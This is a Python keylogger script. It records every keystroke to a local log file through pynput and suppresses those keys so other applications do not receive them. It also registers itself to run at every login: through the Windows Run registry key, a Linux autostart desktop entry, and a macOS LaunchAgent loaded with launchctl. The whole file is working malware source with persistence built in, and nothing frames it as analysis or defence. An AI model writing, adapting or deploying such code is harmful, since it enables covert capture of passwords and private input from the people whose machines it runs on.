import os
import platform
from pynput import keyboard

# File paths
logs_file = ""

def press(key):
    try:
        with open(logs_file, "a") as log:
            log.write('{0}'.format(key.char))
    except AttributeError:
        with open(logs_file, "a") as log:
            log.write('{0}'.format(key))

def release(key):
    if key == keyboard.Key.esc:
        return False

def add_to_startup():
    """
    Configure this script to run at startup based on the OS.
    """
    script_path = os.path.abspath(__file__)
    system = platform.system()

    if system == "Windows":
        try:
            import winreg as reg
            key = r"Software\Microsoft\Windows\CurrentVersion\Run"
            script_name = os.path.basename(script_path).replace('.py', '')
            reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE)
            reg.SetValueEx(reg_key, script_name, 0, reg.REG_SZ, f'"{script_path}"')
            reg.CloseKey(reg_key)
            print("Added to Windows startup.")
        except Exception as e:
            print(f"Failed to add to startup on Windows: {e}")

    elif system == "Linux":
        try:
            autostart_dir = os.path.expanduser("~/.config/autostart")
            os.makedirs(autostart_dir, exist_ok=True)
            desktop_file = os.path.join(autostart_dir, "keylogger.desktop")
            content = f"""[Desktop Entry]
Type=Application
Exec=python3 {script_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name=Keylogger
Comment=Keylogger Script
"""
            with open(desktop_file, "w") as f:
                f.write(content)
            print("Added to Linux startup.")
        except Exception as e:
            print(f"Failed to add to startup on Linux: {e}")

    elif system == "Darwin":
        try:
            plist_dir = os.path.expanduser("~/Library/LaunchAgents")
            os.makedirs(plist_dir, exist_ok=True)
            plist_file = os.path.join(plist_dir, "com.user.keylogger.plist")
            content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.user.keylogger</string>
    <key>ProgramArguments</key>
    <array>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
"""
            with open(plist_file, "w") as f:
                f.write(content)
            os.system(f"launchctl load {plist_file}")
            print("Added to macOS startup.")
        except Exception as e:
            print(f"Failed to add to startup on macOS: {e}")

    else:
        print("Unsupported operating system.")

# Clear the logs file
with open(logs_file, "w") as log:
    log.write("")

# Add the script to startup
add_to_startup()

# Start the keylogger
with keyboard.Listener(on_press=press, on_release=release, suppress=True) as listener:
    listener.join()
